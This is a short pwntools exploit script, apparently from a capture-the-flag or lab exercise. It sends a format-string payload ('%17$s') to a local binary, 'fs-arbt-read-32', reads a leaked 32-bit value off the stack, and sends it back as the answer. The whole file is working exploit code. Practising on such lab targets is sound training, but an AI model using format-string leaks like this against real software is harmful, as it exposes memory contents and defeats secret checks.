#!/usr/bin/env python

from pwn import *

p = process('./fs-arbt-read-32')

print(p.recv())

p.sendline("%17$s")

data = p.recv()

random = u32(data[6:10])

print(hex(random))

p.sendline(hex(random))
print(p.recv())
p.interactive()
